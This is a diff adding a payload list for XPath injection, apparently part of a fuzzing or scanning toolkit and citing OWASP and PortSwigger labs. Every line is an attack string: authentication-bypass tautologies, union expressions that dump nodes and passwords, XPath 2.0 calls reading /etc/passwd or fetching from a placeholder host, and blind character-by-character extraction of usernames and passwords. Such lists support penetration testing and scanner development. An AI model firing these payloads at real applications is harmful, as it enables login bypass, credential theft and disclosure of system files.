@@ -1,0 +1,47 @@
+# category: xpath
+# description: XPath injection — authentication-bypass, blind char-by-char, XPath 2.0 features.
+# references: OWASP XPath Injection, PortSwigger XPath labs.
+
+' or ''='
+' or '1'='1
+" or ""="
+" or "1"="1
+' or 1=1 or ''='
+' or 1=1 or 'a'='a
+'] | //* | ['
+'] | //user/* | ['
+') or ('1'='1
+'] | /child::node() | ['
+/users/user[name='admin']
+//user[login='admin' or '1'='1']
+//user[username/text()='admin' and password/text()='' or '1'='1']
+'; 1 or ''='
+'; 1 or 'a'='a
+%27%20or%20%27%27=%27
+%22%20or%20%22%22=%22
+' or substring(name,1,1)='a
+' or starts-with(name,'a')]
+' or contains(password,'a')]
+
+# ── XPath 2.0 / Xquery ──────────────────────────────────────────────────
+doc('/etc/passwd')
+doc('http://x.test/')
+collection('/etc/passwd')
+unparsed-text('/etc/passwd')
+system-property('xsl:vendor')
+'] | //password | ['
+'] | //* | ['
+'] | ./*[local-name()='password'] | ['
+'] | //user[position()=1]/password | ['
+' or error(count(//*))]
+' or error()]
+'] | system-identifier() | ['
+'] | //* | //text() | ['
+'] | //@* | ['
+
+# ── Blind extraction ────────────────────────────────────────────────────
+' or string-length(name/text())=5 or ''='
+' or substring(name/text(),1,1)='a' or ''='
+' or substring(password/text(),1,1)=codepoints-to-string(97) or ''='
+' or count(/*)=1 or ''='
+' or count(//user)>5 or ''='
